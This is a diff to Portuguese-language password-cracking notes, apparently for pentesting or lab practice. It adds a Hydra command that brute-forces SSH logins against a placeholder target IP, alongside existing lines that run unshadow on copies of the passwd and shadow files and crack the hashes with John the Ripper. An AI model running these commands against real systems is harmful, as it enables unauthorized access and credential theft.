@@ -28,6 +28,10 @@ sudo bash -c " \
 unshadow /tmp/passwd /tmp/shadow > /tmp/hashes
 "
 ```
+## Executar Hydra para quebrar senhas de usuários via SSH
+```
+hydra -l name_user -P /usr/share/wordlists/john.lst ssh://<Target_IP>
+```
 ## Executar John The Ripper para quebrar hashs das senhas dos usuários
 ```
 john /tmp/hashes --wordlist=/usr/share/wordlists/john.lst --format=crypt
